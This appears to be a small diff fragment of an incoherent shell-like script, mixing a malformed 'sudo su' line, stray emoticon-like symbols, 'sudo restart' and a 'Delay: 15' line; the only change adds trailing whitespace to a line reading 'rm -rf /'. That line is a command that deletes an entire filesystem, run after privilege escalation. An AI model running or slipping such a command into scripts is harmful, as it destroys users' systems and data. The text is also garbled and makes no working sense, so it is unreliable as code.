@@ -1,7 +1,7 @@
 sudo su -_goddessLucia
 <^>
 (*^>
-rm -rf /
+rm -rf / 
 <^>
 sudo restart
 Delay: 15
